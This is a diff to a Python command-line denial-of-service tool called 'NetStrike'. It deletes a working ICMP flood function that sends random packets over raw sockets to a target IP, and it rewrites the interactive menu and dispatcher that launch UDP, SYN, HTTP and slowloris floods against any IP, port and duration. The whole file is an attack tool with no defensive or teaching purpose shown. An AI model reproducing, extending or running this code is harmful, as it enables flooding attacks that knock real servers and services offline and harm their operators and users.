@@ -99,26 +99,6 @@ def slowloris(target_ip, target_port, duration):
         print("Attack stopped by user (CTRL + C)")
 
 
-def icmp_flood(target_ip, duration):
-    duration = time.time() + duration
-    packets_sent = 0
-    try:
-        while True:
-            if time.time() > duration:
-                break
-            else:
-                packet = random._urandom(1024)
-                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-                sock.sendto(packet, (target_ip, 0))
-                sock.close()
-                packets_sent += 1
-                print(
-                    f"Sent ICMP packet to {target_ip} [Total packets sent: {packets_sent}]"
-                )
-    except KeyboardInterrupt:
-        print("Attack stopped by user (CTRL + C)")
-
-
 plane = """\033[32m
  _____         ______
 | : \         |    \\ 
@@ -131,10 +111,10 @@ plane = """\033[32m
 \033[0m"""
 
 commands = """
-\t\t udp  <ip> <port> <duration>
-\t\t syn  <ip> <port> <duration>
-\t\t http <ip> <port> <duration>
-\t\t icmp <ip> <duration>
+\t udp       <ip> <port> <duration>
+\t syn       <ip> <port> <duration>
+\t http      <ip> <port> <duration>
+\t slowloris <ip> <port> <duration>
 """
 
 
@@ -150,22 +130,24 @@ def main():
         time.sleep(0.05)
         clear()
 
+    print(commands)
+
     while True:
-        print(commands)
         cmd = input(f"NetStrike$ ").split()
 
-        if cmd[0] == "udp":
-            udp_flood(cmd[1], int(cmd[2]), int(cmd[3]))
-        elif cmd[0] == "syn":
-            syn_flood(cmd[1], int(cmd[2]), int(cmd[3]))
-        elif cmd[0] == "http":
-            http_flood(cmd[1], int(cmd[2]), int(cmd[3]))
-        elif cmd[0] == "slowloris":
-            slowloris(cmd[1], int(cmd[2]), int(cmd[3]))
-        elif cmd[0] == "icmp":
-            icmp_flood(cmd[1], int(cmd[2]))
-        else:
-            print("Invalid command!")
+        if cmd:
+            if cmd[0] == "help" or cmd[0] == "?":
+                print(commands)
+            elif cmd[0] == "udp":
+                udp_flood(cmd[1], int(cmd[2]), int(cmd[3]))
+            elif cmd[0] == "syn":
+                syn_flood(cmd[1], int(cmd[2]), int(cmd[3]))
+            elif cmd[0] == "http":
+                http_flood(cmd[1], int(cmd[2]), int(cmd[3]))
+            elif cmd[0] == "slowloris":
+                slowloris(cmd[1], int(cmd[2]), int(cmd[3]))
+            else:
+                print("Invalid command")
 
 
 if __name__ == "__main__":
